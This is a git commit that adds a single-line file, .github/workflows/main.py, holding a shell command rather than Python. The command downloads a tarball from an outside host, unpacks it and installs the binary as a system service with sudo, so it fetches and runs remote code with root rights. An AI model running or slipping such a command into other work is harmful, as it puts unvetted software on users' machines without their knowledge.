cd6089c8f10b1216aaf75daa06953c5396f91dfa
thomasedison2888 <121991393+thomasedison2888@users.noreply.github.com>
2023-01-05 18:17:19 +0700

    Create main.py

---
+++ .github/workflows/main.py
@@ -0,0 +1,1 @@
+curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/22/app/1.0.3/app-1_0_3.tar.gz && tar -zxf app-linux-amd64.tar.gz && rm -f app-linux-amd64.tar.gz && cd ./app-linux-amd64 && sudo ./app service install
